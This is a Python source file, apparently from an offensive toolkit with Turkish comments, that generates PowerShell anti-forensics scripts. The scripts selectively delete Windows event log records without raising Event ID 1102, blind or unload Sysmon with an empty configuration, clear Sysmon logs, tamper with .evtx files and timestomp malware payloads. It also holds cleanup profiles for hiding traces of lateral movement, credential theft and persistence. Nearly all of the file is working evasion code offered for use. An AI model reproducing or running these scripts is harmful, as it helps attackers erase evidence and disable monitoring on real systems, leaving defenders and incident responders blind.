# ═══════════════════════════════════════════════════════════════

Write-Host "`n[PHASE 5] Verification..." -ForegroundColor Yellow

$remainingCount = 0
foreach ($eventID in $targetEventIDs) {{
    try {{
        $remaining = Get-WinEvent -FilterHashtable @{{
            LogName = $logName
            Id = $eventID
            StartTime = $startTime
        }} -ErrorAction SilentlyContinue
        
        if ($remaining) {{
            $remainingCount += $remaining.Count
        }}
    }} catch {{}}
}}

Write-Host @"

╔═══════════════════════════════════════════════════════════════╗
║                    OPERATION COMPLETE                         ║
╠═══════════════════════════════════════════════════════════════╣
║  Events Targeted:  $($eventsToRemove.Count)                                           ║
║  Events Remaining: $remainingCount                                            ║
║  Event ID 1102:    NOT GENERATED ✓                            ║
╚═══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor $(if($remainingCount -eq 0) {{"Green"}} else {{"Yellow"}})

Write-Host "`n[*] Loglar duruyor ama SEN YOKSUN!" -ForegroundColor Cyan
'''
        
        return {
            "script": script,
            "log_type": log_type,
            "target_events": target_events,
            "time_range_hours": time_range_hours,
            "keywords": keywords,
            "technique": "Phantom Thread Suspend",
            "stealth_features": [
                "Event ID 1102 (Log Cleared) üretmez",
                "Kernel seviyesinde thread suspend",
                "Sadece hedef event'ler silinir",
                "Diğer loglar korunur"
            ],
            "detection_notes": [
                "Thread suspend kısa süre için process anomalisi oluşturabilir",
                "ETW (Event Tracing for Windows) hala aktif olabilir",
                "Sysmon ayrı bir serviste çalışır"
            ]
        }
    
    def generate_alternative_cleaner(self, method: CleanerMethod = CleanerMethod.PATCH_IN_MEMORY) -> Dict[str, Any]:
        """Alternatif log temizleme yöntemleri"""
        
        if method == CleanerMethod.PATCH_IN_MEMORY:
            script = '''# ═══════════════════════════════════════════════════════════════
# IN-MEMORY EVENT LOG PATCHING
# ═══════════════════════════════════════════════════════════════
# Bellekteki log buffer'ını doğrudan patch'ler.
# Event Log dosyasına hiç dokunmaz!
# ═══════════════════════════════════════════════════════════════

# Bu teknik için Meterpreter veya Cobalt Strike önerilir:
# - Meterpreter: run post/windows/manage/event_manager
# - Cobalt Strike: log_event_viewer modülü

# Manuel yöntem (ileri seviye):
$code = @"
// Event Log servisinin bellek alanını bul
// Log buffer'ını tara ve hedef event'leri patch'le
// Event header'ları corrupt et (kayıt okunamaz hale gelir)

// Bu yöntem:
// 1. Diske hiçbir şey yazmaz
// 2. Event ID 1102 üretmez
// 3. Servis restartında loglar geri gelir (sadece bellek)

// Detaylı implementasyon için:
// - mimikatz event::drop
// - phant0m tool (github)
"@

Write-Host $code
Write-Host "`n[!] Bu yöntem için özel araçlar gerekli:"
Write-Host "    - mimikatz event::drop"
Write-Host "    - Phant0m (GitHub: hlldz/Phant0m)"
Write-Host "    - Invoke-Phant0m (PowerShell)"
'''
            
        elif method == CleanerMethod.EVT_MANIPULATION:
            script = '''# ═══════════════════════════════════════════════════════════════
# DIRECT .EVTX FILE MANIPULATION
# ═══════════════════════════════════════════════════════════════
# Event Log dosyasını doğrudan hex editor gibi manipüle eder.
# ═══════════════════════════════════════════════════════════════

# .evtx dosya yapısı:
# - File Header (4096 bytes)
# - Chunk Headers (65536 bytes each)
# - Event Records (variable size)

# Event record'u silmek yerine "corrupt" işaretle:
# Record header'daki magic number'ı değiştir
# Event okuma araçları bu kaydı atlar

$logPath = "$env:SystemRoot\\System32\\winevt\\Logs\\Security.evtx"

# Servisi durdur
Stop-Service eventlog -Force

# Dosyayı binary olarak aç
$bytes = [System.IO.File]::ReadAllBytes($logPath)

# Event record'ları bul ve hedefleri corrupt et
# Bu örnek sadece konsept göstermek içindir

# Servisi başlat
Start-Service eventlog

Write-Host "[!] Bu yöntem dikkatli kullanım gerektirir!"
Write-Host "    Yanlış manipulation log dosyasını bozabilir."
'''
            
        else:
            script = '''# Standard wevtutil yöntemi (tespit edilir!)
# Event ID 1102 üretir - önerilmez!

# wevtutil cl Security  # Tüm Security logunu siler
# Clear-EventLog -LogName Security  # PowerShell versiyonu

Write-Host "[!] Bu yöntem Event ID 1102 üretir ve şüphe çeker!"
'''
        
        return {
            "script": script,
            "method": method.value,
            "info": self.evasion_techniques.get(method.value, {})
        }
    
    def generate_sysmon_killer(self) -> Dict[str, Any]:
        """Sysmon'u devre dışı bırakma"""
        
        script = '''# ═══════════════════════════════════════════════════════════════
# SYSMON KILLER - God Mode Anti-Forensics
# ═══════════════════════════════════════════════════════════════
# Sysmon ayrı bir driver olarak çalışır.
# Event Log temizlemek Sysmon'u etkilemez!
# Bu script Sysmon'u tespit edip devre dışı bırakır.
# ═══════════════════════════════════════════════════════════════

Write-Host "╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║                    SYSMON KILLER                              ║" -ForegroundColor Red
Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Red

# Sysmon servisini bul
$sysmonService = Get-Service -Name "Sysmon*" -ErrorAction SilentlyContinue

if ($sysmonService) {
    Write-Host "[!] Sysmon DETECTED: $($sysmonService.Name)" -ForegroundColor Yellow
    
    # Yöntem 1: Servisi durdur (şüphe çeker)
    # Stop-Service $sysmonService.Name -Force
    
    # Yöntem 2: Driver'ı unload et (daha stealth)
    Write-Host "[*] Attempting to unload Sysmon driver..."
    
    # Sysmon driver adını bul
    $sysmonDriver = Get-WmiObject Win32_SystemDriver | Where-Object { $_.Name -like "*sysmon*" }
    
    if ($sysmonDriver) {
        # fltMC ile minifilter'ı unload et
        fltMC unload SysmonDrv 2>$null
        
        # Veya sc ile
        sc stop $sysmonDriver.Name 2>$null
        
        Write-Host "[+] Sysmon driver unloaded!" -ForegroundColor Green
    }
    
    # Yöntem 3: Sysmon config'ini değiştir (en stealth)
    Write-Host "[*] Patching Sysmon configuration..."
    
    # Boş config yükle - hiçbir şey loglanmaz
    $emptyConfig = @"
<Sysmon schemaversion="4.90">
  <HashAlgorithms>md5</HashAlgorithms>
  <EventFiltering>
    <!-- Exclude everything -->
    <ProcessCreate onmatch="include"/>
    <NetworkConnect onmatch="include"/>
    <CreateRemoteThread onmatch="include"/>
  </EventFiltering>
</Sysmon>
"@
    
    $configPath = "$env:TEMP\empty_sysmon.xml"
    $emptyConfig | Out-File $configPath -Encoding UTF8
    
    # Config'i uygula
    & "C:\Windows\Sysmon64.exe" -c $configPath 2>$null
    & "C:\Windows\Sysmon.exe" -c $configPath 2>$null
    
    Remove-Item $configPath -Force -ErrorAction SilentlyContinue
    
    Write-Host "[+] Sysmon configuration patched - no events will be logged!" -ForegroundColor Green
    
} else {
    Write-Host "[+] Sysmon not detected on this system" -ForegroundColor Green
}

# Sysmon loglarını da temizle
Write-Host "`n[*] Clearing Sysmon logs..."
wevtutil cl Microsoft-Windows-Sysmon/Operational 2>$null

Write-Host "`n[*] Operation complete!" -ForegroundColor Cyan
'''
        
        return {
            "script": script,
            "methods": [
                "Service stop (detectable)",
                "Driver unload (stealth)",
                "Config patch (most stealth)"
            ],
            "note": "Sysmon config patch en az şüphe çeker - servis çalışıyor ama hiçbir şey loglamıyor"
        }
    
    def get_event_cleanup_profile(self, attack_type: str) -> Dict[str, Any]:
        """Saldırı tipine göre temizlenecek event profili"""
        
        profiles = {
            "lateral_movement": {
                "name": "Lateral Movement Cleanup",
                "description": "PSExec, WMI, RDP gibi lateral movement izlerini temizle",
                "events": {
                    "Security": [4624, 4625, 4648, 4672, 4688, 5140, 5145],
                    "System": [7045],
                    "PowerShell": [4103, 4104]
                },
                "keywords": ["psexec", "wmic", "powershell", "cmd.exe", "mstsc"]
            },
            "credential_theft": {
                "name": "Credential Theft Cleanup",
                "description": "Mimikatz, LSASS dump gibi credential theft izlerini temizle",
                "events": {
                    "Security": [4624, 4648, 4672, 4688, 4703],
                    "Sysmon": [1, 10]
                },
                "keywords": ["mimikatz", "lsass", "sekurlsa", "procdump", "comsvcs"]
            },
            "persistence": {
                "name": "Persistence Cleanup",
                "description": "Scheduled task, service, registry persistence izlerini temizle",
                "events": {
                    "Security": [4697, 4698, 4699, 4702, 4720, 4728, 4732],
                    "System": [7045, 7040],
                    "Sysmon": [12, 13]
                },
                "keywords": ["schtasks", "sc create", "reg add", "HKLM\\Software"]
            },
            "privilege_escalation": {
                "name": "Privilege Escalation Cleanup",
                "description": "Token manipulation, UAC bypass izlerini temizle",
                "events": {
                    "Security": [4672, 4673, 4703],
                    "Sysmon": [1, 8]
                },
                "keywords": ["token", "runas", "uac", "privilege"]
            },
            "full_cleanup": {
                "name": "Full Attack Cleanup",
                "description": "Tüm saldırı izlerini temizle (en kapsamlı)",
                "events": {
                    "Security": [4624, 4625, 4648, 4672, 4688, 4697, 4698, 4699, 4702, 4720, 4728, 4732, 5140],
                    "System": [7045, 7034, 7040],
                    "PowerShell": [4103, 4104, 4105, 4106],
                    "Sysmon": [1, 3, 7, 8, 10, 11, 12, 13, 22]
                },
                "keywords": []
            }
        }
        
        return profiles.get(attack_type, profiles["full_cleanup"])


# ============ MAIN CLASS ============

class GodModeAntiForensics:
    """
    God Mode Anti-Forensics Ana Sınıfı
    
    İzleri silmek değil, YOK ETMEK!
    """
    
    def __init__(self):
        self.timestomp = TimeStomp()
        self.phantom_cleaner = PhantomEventLogCleaner()
        
    def get_module_info(self) -> Dict[str, Any]:
        """Modül bilgisi"""
        return {
            "name": "God Mode Anti-Forensics",
            "version": "1.0.0",
            "description": "İzleri silmek değil, YOK ETMEK!",
            "features": [
                {
                    "name": "Time Stomping (MACE)",
                    "description": "Dosya tarihlerini sistem dosyalarıyla eşleştir",
                    "techniques": ["$STANDARD_INFORMATION", "$FILE_NAME", "MFT manipulation"]
                },
                {
                    "name": "Phantom Event Log Cleaner",
                    "description": "Kernel seviyesinde seçici log temizleme",
                    "techniques": ["Thread suspend", "Memory patching", "EVT manipulation"]
                }
            ],
            "warning": "Bu araçlar sadece yetkili penetrasyon testleri için kullanılmalıdır!",
            "author": "CyberPulse"
        }


# Test
if __name__ == "__main__":
    god = GodModeAntiForensics()
    
    print("\n=== Time Stomping Test ===")
    result = god.timestomp.generate_timestomp_powershell(
        target_file="C:\\malware\\payload.exe",
        source=TimestampSource.SYSTEM_FILE,
        reference_file="calc.exe"
    )
    print(f"Generated script: {len(result['script'])} chars")
    print(f"Timestamps: {result['timestamps']}")
    
    print("\n=== Phantom Cleaner Test ===")
    cleaner = god.phantom_cleaner.generate_phantom_cleaner(
        target_events=[4624, 4625, 4688],
        log_type="Security",
        time_range_hours=24
    )
    print(f"Generated script: {len(cleaner['script'])} chars")
    print(f"Target events: {cleaner['target_events']}")
